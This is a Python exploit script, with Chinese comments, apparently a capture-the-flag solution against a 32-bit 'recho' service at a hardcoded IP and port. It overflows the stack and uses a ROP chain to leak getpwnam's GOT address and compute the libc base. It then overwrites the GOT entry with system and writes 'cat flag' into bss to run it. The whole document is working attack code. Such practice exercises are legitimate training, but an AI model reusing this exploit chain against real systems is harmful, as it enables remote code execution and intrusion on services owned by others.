#encoding:utf-8
from zio import *

host = ('166.111.132.132', 1234)

#objdump -d ./recho | egrep 'pop|ret'
popret = 0x8048615

#bss objdump -x 
bss = 0x0804a280

# objdump -D ./recho > d.txt
sendstr   = 0x08048acf ##
recv_line = 0x080489e6 ##
getpwnam_got = 0x804a208 ##
getpwnam_plt = 0x8048640 ##

#objdump -T libc.so.6 > t.txt
system_o = 0x0003aeb0 ##
getpwnam_o  = 0x000b1b70 ##


io = zio(host, print_write=False, print_read=COLORED(REPR, 'red'), timeout=20)

#溢出栈
payload = (268) * 'A'

#使用sendstr函数使服务器发送getpwnam的got地址，参数为getpwnam_got
payload += l32(sendstr) + l32(popret) + l32(getpwnam_got)
#使用recv_line函数覆盖getpwnam_got，参数为getpwnam_got的地址
payload += l32(recv_line) + l32(popret) + l32(getpwnam_got)
#使用recv_line函数覆盖bss内一段可以写的地址为本地传过去的命令,参数为bss段内可写的地址
payload += l32(recv_line) + l32(popret) + l32(bss)
#调用system函数，参数为刚才重写入内存的指令bss
payload += l32(getpwnam_plt) + l32(popret) + l32(bss)

#接收
io.readline()

#发送整个函数
io.write(payload + '\0\n')
#接受recv_line函数的
io.read(len(payload))

#
libc = l32(io.read(4)) - getpwnam_o
system_addr = libc + system_o
#发送system_addr用作第二个函数
io.write(l32(system_addr) + '\0\n')
#发送指令 用作第三个函数
io.write('cat flag\0\n')
#接收该函数的返回，即cat flag的返回
io.readline()

io.interact()

